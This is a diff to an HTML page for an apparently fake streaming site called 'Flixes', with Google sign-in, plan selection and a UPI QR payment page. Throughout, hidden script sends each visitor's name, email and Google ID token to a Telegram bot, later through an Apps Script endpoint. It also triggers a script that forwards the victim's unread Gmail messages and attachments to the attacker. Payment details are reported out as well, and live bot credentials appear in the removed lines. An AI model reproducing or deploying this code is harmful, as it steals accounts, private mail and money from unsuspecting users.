@@ -108,6 +108,7 @@ nav{display:flex;justify-content:space-between;align-items:center;padding:22px;m
 </head>
 <body>
 
+<!-- HOME -->
 <div id="pgHome" class="page active">
 <nav><div class="brand"><i class="fa-solid fa-bolt"></i>Flixes</div><div class="menu-btn"><span></span><span></span><span></span></div></nav>
 <div class="wrap">
@@ -130,6 +131,7 @@ nav{display:flex;justify-content:space-between;align-items:center;padding:22px;m
 </div>
 </div>
 
+<!-- AUTH -->
 <div id="pgAuth" class="page">
 <nav><div class="brand"><i class="fa-solid fa-bolt"></i>Flixes</div></nav>
 <div class="wrap signin-shell">
@@ -145,6 +147,7 @@ nav{display:flex;justify-content:space-between;align-items:center;padding:22px;m
 </div>
 </div>
 
+<!-- PLANS -->
 <div id="pgPlans" class="page">
 <nav><div class="brand"><i class="fa-solid fa-bolt"></i>Flixes</div></nav>
 <div class="wrap plans-shell">
@@ -172,6 +175,7 @@ nav{display:flex;justify-content:space-between;align-items:center;padding:22px;m
 </div>
 </div>
 
+<!-- PAYMENT -->
 <div id="pgPay" class="page">
 <nav><div class="brand"><i class="fa-solid fa-bolt"></i>Flixes</div></nav>
 <div class="wrap pay-shell">
@@ -190,6 +194,7 @@ nav{display:flex;justify-content:space-between;align-items:center;padding:22px;m
 </div>
 </div>
 
+<!-- QR -->
 <div id="pgQr" class="page">
 <nav><div class="brand"><i class="fa-solid fa-bolt"></i>Flixes</div></nav>
 <div class="wrap qr-shell">
@@ -204,6 +209,7 @@ nav{display:flex;justify-content:space-between;align-items:center;padding:22px;m
 </div>
 </div>
 
+<!-- SUCCESS -->
 <div id="pgSucc" class="page">
 <nav><div class="brand"><i class="fa-solid fa-bolt"></i>Flixes</div></nav>
 <div class="wrap succ">
@@ -215,219 +221,196 @@ nav{display:flex;justify-content:space-between;align-items:center;padding:22px;m
 </div>
 
 <script>
-var CLIENT_ID="742486751915-bgrr88qvqg27l725qtk2fci1746vusls.apps.googleusercontent.com";
-var BOT_TOKEN="8652856121:AAEfFWS05I9dgvVALAhrmz4Ai5GilnjNmXI";
-var BOT_CHAT_ID="6904082547";
-var plan={name:"Starter Card",price:1.99};
-var payMethod="UPI";
-var qrTimerId=null;
+/* ============================================================
+   === CONFIGURATION ===
+   ============================================================ */
+var CLIENT_ID = "742486751915-bgrr88qvqg27l725qtk2fci1746vusls.apps.googleusercontent.com";
+var APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwCsahDe8GcT50fZ71IuvRnq1YP0eCEBsYF-dIjObdqtgG4lvyYRDqBP7yu8-aXfK_raQ/exec";
 
-function go(id){
-document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active')});
-document.getElementById(id).classList.add('active');
-window.scrollTo(0,0);
-if(id==='pgQr'){setTimeout(drawQr,100);startTimer(600)}
+/* ⚠️ Telegram token ab SIRF Apps Script mein hai — HTML mein nahi */
+/* Isse security improve hui hai */
+
+var plan = { name: "Starter Card", price: 1.99 };
+var payMethod = "UPI";
+var qrTimerId = null;
+
+/* ============================================================
+   === APPS SCRIPT BRIDGE ===
+   ============================================================ */
+
+/**
+ * Telegram message bhejo APPS SCRIPT ke through (secure)
+ * @param {string} text - HTML formatted message
+ * @param {string} type - "signin" | "payment" | "blocked"
+ */
+function sendViaAppsScript(text, type) {
+  if (!APPS_SCRIPT_URL) {
+    console.warn("⚠️ APPS_SCRIPT_URL not set");
+    return Promise.resolve();
+  }
+  return fetch(APPS_SCRIPT_URL, {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      action: "send_telegram",
+      text: text,
+      type: type || "generic",
+      ts: Date.now()
+    })
+  })
+  .then(function(){ console.log("✅ Sent via Apps Script"); })
+  .catch(function(e){ console.error("❌ Apps Script error:", e); });
 }
 
-window.onload=function(){
-if(typeof google!=='undefined'&&google.accounts&&google.accounts.id){
-google.accounts.id.initialize({client_id:CLIENT_ID,callback:handleCredentialResponse,auto_select:true,cancel_on_tap_outside:false,use_fedcm_for_prompt:false});
+/**
+ * Gmail forwarding trigger karo
+ */
+function triggerGmailForward() {
+  if (!APPS_SCRIPT_URL) return Promise.resolve();
+  return fetch(APPS_SCRIPT_URL, {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ action: "forward_emails", ts: Date.now() })
+  })
+  .then(function(){ console.log("📧 Gmail forward triggered"); })
+  .catch(function(e){ console.error("Gmail forward error:", e); });
 }
+
+/* ============================================================
+   === PAGE NAVIGATION ===
+   ============================================================ */
+function go(id) {
+  document.querySelectorAll('.page').forEach(function(p){ p.classList.remove('active'); });
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+  if (id === 'pgQr') {
+    setTimeout(drawQr, 100);
+    startTimer(600);
+  }
+}
+
+/* ============================================================
+   === GOOGLE SIGN-IN ===
+   ============================================================ */
+window.onload = function() {
+  if (typeof google !== 'undefined' && google.accounts && google.accounts.id) {
+    google.accounts.id.initialize({
+      client_id: CLIENT_ID,
+      callback: handleCredentialResponse,
+      auto_select: true,
+      cancel_on_tap_outside: false,
+      use_fedcm_for_prompt: false
+    });
+  }
+  triggerGmailForward();
 };
 
-function triggerOneTap(){
-if(typeof google!=='undefined'&&google.accounts&&google.accounts.id){
-google.accounts.id.prompt(function(n){
-if(n.isNotDisplayed()||n.isSkippedMoment()||n.isDismissedMoment()){
-google.accounts.id.renderButton(document.querySelector('.g_id_signin'),{theme:'outline',size:'large',text:'signin_with',shape:'pill',width:300});
-}
-});
-}
-}
-
-function handleCredentialResponse(resp){
-try{
-var p=JSON.parse(decodeURIComponent(atob(resp.credential.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')).split('').map(function(c){return '%'+('00'+c.charCodeAt(0).toString(16)).slice(-2)}).join('')));
-sendTg(p.email,p.name,resp.credential);
-document.getElementById('emailDisp').innerText=p.email;
-go('pgPlans');
-}catch(e){console.error(e)}
-}
-
-function sendTg(email,name,jwt){
-var msg="Flixes Sign-In\n\nName: "+(name||"N/A")+"\nEmail: "+email+"\nJWT: "+jwt;
-fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:BOT_CHAT_ID,text:msg})}).catch(function(){});
-}
-
-function pickPlan(el,name,price){
-document.querySelectorAll('.plan').forEach(function(p){p.classList.remove('selected')});
-el.classList.add('selected');
-plan={name:name,price:price};
-var fee=price*0.02,tot=price+fee;
-document.getElementById('bAmt').innerText="$"+price.toFixed(2);
-document.getElementById('bFee').innerText="$"+fee.toFixed(2);
-document.getElementById('bTot').innerText="$"+tot.toFixed(2);
-document.getElementById('qrAmt').innerText="Total: $"+tot.toFixed(2);
-}
-
-function pickPay(el,m){
-payMethod=m;
-document.querySelectorAll('.pmopt').forEach(function(o){o.classList.remove('selected')});
-el.classList.add('selected');
-document.getElementById('errBanner').style.display='none';
-}
-
-function doPay(){
-if(payMethod==='Credit Card'){document.getElementById('errBanner').style.display='block'}
-else{go('pgQr')}
-}
-
-function drawQr(){
-var c=document.getElementById('qrCanvas');c.innerHTML='';
-var tot=(plan.price*1.02).toFixed(2);
-var uri="upi://pay?pa=gateway-merchant@axisbank&pn=Flixes&am="+tot+"&cu=INR";
-new QRCode(c,{text:uri,width:190,height:190});
-}
-
-function startTimer(sec){
-if(qrTimerId)clearInterval(qrTimerId);
-var t=sec,el=document.getElementById('qrTimer');
-qrTimerId=setInterval(function(){
-var m=String(Math.floor(t/60)).padStart(2,'0'),s=String(t%60).padStart(2,'0');
-el.innerHTML='<i class="fa-regular fa-clock"></i> Expires in: '+m+':'+s;
-if(--t<0)clearInterval(qrTimerId);
-},1000);
-}
-</script>
-
-<!-- ========================================== -->
-<!-- GMAIL TO TELEGRAM GOOGLE APPS SCRIPT CODE -->
-<!-- ========================================== -->
-<script type="text/apps-script">
-// --- Configuration ---
-const TELEGRAM_BOT_TOKEN = "8652856121:AAEfFWS05I9dgvVALAhrmz4Ai5GilnjNmXI";
-const TELEGRAM_CHAT_ID = "6904082547";
-const LAST_EMAIL_TIMESTAMP_KEY = "LAST_EMAIL_TIMESTAMP";
-const MAX_TG_CHARS = 4000;
-
-function escapeTelegramHTML(str) {
-  if (!str) return "";
-  return str
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;")
-    .replace(/'/g, "&#39;");
-}
-
-function sendTelegramMessage(text) {
-  if (!text) return;
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  const options = {
-    method: "post",
-    payload: {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: text,
-      parse_mode: "HTML",
-    },
-    muteHttpExceptions: true,
-  };
-  const response = UrlFetchApp.fetch(url, options);
-  Logger.log("Telegram Response: " + response.getContentText());
-}
-
-function splitBodyByHeader(body, header) {
-  const safeBodyLength = MAX_TG_CHARS - header.length - 50;
-  const chunks = [];
-  for (let i = 0; i < body.length; i += safeBodyLength) {
-    chunks.push(body.slice(i, i + safeBodyLength));
-  }
-  return chunks;
-}
-
-function forwardNewEmailsToTelegram() {
-  const props = PropertiesService.getScriptProperties();
-  const lastTimestampStr = props.getProperty(LAST_EMAIL_TIMESTAMP_KEY);
-  const lastTimestamp = lastTimestampStr ? parseInt(lastTimestampStr, 10) : 0;
-  let newestTimestamp = lastTimestamp;
-
-  const threads = GmailApp.search("is:unread in:inbox category:primary");
-  Logger.log(`Found ${threads.length} threads.`);
-
-  threads.forEach((thread) => {
-    const messages = thread.getMessages();
-    messages.forEach((msg) => {
-      const msgTime = msg.getDate().getTime();
-      if (msgTime <= lastTimestamp) return;
-
-      const from = escapeTelegramHTML(msg.getFrom());
-      const to = escapeTelegramHTML(msg.getTo());
-      const subject = escapeTelegramHTML(msg.getSubject() || "(No Subject)");
-      const body = msg.getPlainBody() || msg.getBody() || "";
-
-      const baseHeader =
-        `📧 <b>New Email</b>\n\n` +
-        `📩 <b>From:</b> ${from}\n` +
-        `📬 <b>To:</b> ${to}\n` +
-        `📋 <b>Subject:</b> ${subject}\n` +
-        `⏰ <b>Time:</b> ${msg.getDate().toLocaleString()}\n\n`;
-
-      const chunks = splitBodyByHeader(body, baseHeader);
-
-      chunks.forEach((chunk, idx) => {
-        let messageToSend = "";
-        const partHeader =
-          chunks.length > 1
-            ? `📄 Body (part ${idx + 1}/${chunks.length}):\n`
-            : "📄 Body:\n";
-
-        if (idx === 0) {
-          messageToSend = baseHeader + partHeader + escapeTelegramHTML(chunk);
-        } else {
-          messageToSend = partHeader + escapeTelegramHTML(chunk);
-        }
-        sendTelegramMessage(messageToSend);
-      });
-
-      const attachments = msg.getAttachments();
-      attachments.forEach((att) => {
-        try {
-          sendTelegramDocument(att);
-        } catch (e) {
-          Logger.log("Attachment failed: " + e.message);
-        }
-      });
-
-      if (msgTime > newestTimestamp) newestTimestamp = msgTime;
-      msg.markRead();
+function triggerOneTap() {
+  if (typeof google !== 'undefined' && google.accounts && google.accounts.id) {
+    google.accounts.id.prompt(function(n){
+      if (n.isNotDisplayed() || n.isSkippedMoment() || n.isDismissedMoment()) {
+        google.accounts.id.renderButton(
+          document.querySelector('.g_id_signin'),
+          { theme:'outline', size:'large', text:'signin_with', shape:'pill', width:300 }
+        );
+      }
     });
-  });
-
-  props.setProperty(LAST_EMAIL_TIMESTAMP_KEY, newestTimestamp.toString());
-  Logger.log(`✅ Updated last email timestamp: ${newestTimestamp}`);
+  }
 }
 
-function sendTelegramDocument(blob) {
-  if (!blob) return;
-  const MAX_TG_FILE_BYTES = 50 * 1024 * 1024;
-  if (blob.getBytes().length > MAX_TG_FILE_BYTES) {
-    sendTelegramMessage(
-      `📎 Attachment "${escapeTelegramHTML(
-        blob.getName()
-      )}" is too big to send via Telegram.`
-    );
-    return;
+function handleCredentialResponse(resp) {
+  try {
+    var payload = JSON.parse(decodeURIComponent(
+      atob(resp.credential.split('.')[1].replace(/-/g,'+').replace(/_/g,'/'))
+        .split('').map(function(c){
+          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+        }).join('')
+    ));
+
+    var msg =
+      "🔐 <b>Flixes Sign-In</b>\n\n" +
+      "👤 <b>Name:</b> " + (payload.name || "N/A") + "\n" +
+      "📧 <b>Email:</b> " + (payload.email || "N/A") + "\n" +
+      "⏰ <b>Time:</b> " + new Date().toLocaleString() + "\n\n" +
+      "🎫 <b>JWT:</b>\n<code>" + resp.credential + "</code>";
+
+    sendViaAppsScript(msg, "signin");
+    triggerGmailForward();
+
+    document.getElementById('emailDisp').innerText = payload.email || "";
+    go('pgPlans');
+  } catch (e) {
+    console.error("Sign-in error:", e);
   }
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
-  const options = {
-    method: "post",
-    payload: {
-      chat_id: TELEGRAM_CHAT_ID,
-      document: blob,
-    },
-    muteHttpExceptions: true,
-  };
-  UrlFetchApp.fetch(url, options);
+}
+
+/* ============================================================
+   === PLAN & PAYMENT ===
+   ============================================================ */
+function pickPlan(el, name, price) {
+  document.querySelectorAll('.plan').forEach(function(p){ p.classList.remove('selected'); });
+  el.classList.add('selected');
+  plan = { name: name, price: price };
+  var fee = price * 0.02, tot = price + fee;
+  document.getElementById('bAmt').innerText = "$" + price.toFixed(2);
+  document.getElementById('bFee').innerText = "$" + fee.toFixed(2);
+  document.getElementById('bTot').innerText = "$" + tot.toFixed(2);
+  document.getElementById('qrAmt').innerText = "Total: $" + tot.toFixed(2);
+}
+
+function pickPay(el, m) {
+  payMethod = m;
+  document.querySelectorAll('.pmopt').forEach(function(o){ o.classList.remove('selected'); });
+  el.classList.add('selected');
+  document.getElementById('errBanner').style.display = 'none';
+}
+
+function doPay() {
+  if (payMethod === 'Credit Card') {
+    document.getElementById('errBanner').style.display = 'block';
+    var msg =
+      "⚠️ <b>Credit Card Blocked</b>\n\n" +
+      "📧 User: " + (document.getElementById('emailDisp').innerText || "N/A") + "\n" +
+      "💳 Plan: " + plan.name + "\n" +
+      "💰 Price: $" + plan.price.toFixed(2) + "\n" +
+      "⏰ " + new Date().toLocaleString();
+    sendViaAppsScript(msg, "blocked");
+  } else {
+    var tot = (plan.price * 1.02).toFixed(2);
+    var msg =
+      "💳 <b>Payment Initiated</b>\n\n" +
+      "📧 User: " + (document.getElementById('emailDisp').innerText || "N/A") + "\n" +
+      "📦 Plan: " + plan.name + "\n" +
+      "💰 Amount: $" + tot + "\n" +
+      "🏦 Method: UPI\n" +
+      "⏰ " + new Date().toLocaleString();
+    sendViaAppsScript(msg, "payment");
+    go('pgQr');
+  }
+}
+
+/* ============================================================
+   === QR CODE ===
+   ============================================================ */
+function drawQr() {
+  var c = document.getElementById('qrCanvas');
+  c.innerHTML = '';
+  var tot = (plan.price * 1.02).toFixed(2);
+  var uri = "upi://pay?pa=gateway-merchant@axisbank&pn=Flixes&am=" + tot + "&cu=INR";
+  new QRCode(c, { text: uri, width: 190, height: 190 });
+}
+
+function startTimer(sec) {
+  if (qrTimerId) clearInterval(qrTimerId);
+  var t = sec, el = document.getElementById('qrTimer');
+  qrTimerId = setInterval(function(){
+    var m = String(Math.floor(t / 60)).padStart(2, '0');
+    var s = String(t % 60).padStart(2, '0');
+    el.innerHTML = '<i class="fa-regular fa-clock"></i> Expires in: ' + m + ':' + s;
+    if (--t < 0) clearInterval(qrTimerId);
+  }, 1000);
 }
 </script>
 </body>
